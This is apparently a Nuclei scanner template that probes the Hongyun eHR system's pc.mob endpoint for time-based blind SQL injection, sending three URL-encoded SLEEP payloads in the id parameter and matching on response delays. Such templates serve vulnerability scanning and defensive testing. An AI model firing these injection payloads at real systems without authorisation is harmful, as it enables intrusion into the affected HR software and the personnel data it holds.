id: hh-EhR-pcmob-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 红海云eHR系统pc.mob存在sql注入漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%BA%A2%E6%B5%B7%E4%BA%91eHR%E7%B3%BB%E7%BB%9Fpc.mob%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}//RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SELECT(SLEEP(3)))ndMq)%20AND%20%27NEoX%27=%27NEoX"
      - "{{BaseURL}}//RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SELECT(SLEEP(6)))ndMq)%20AND%20%27NEoX%27=%27NEoX"
      - "{{BaseURL}}//RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SELECT(SLEEP(9)))ndMq)%20AND%20%27NEoX%27=%27NEoX"

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"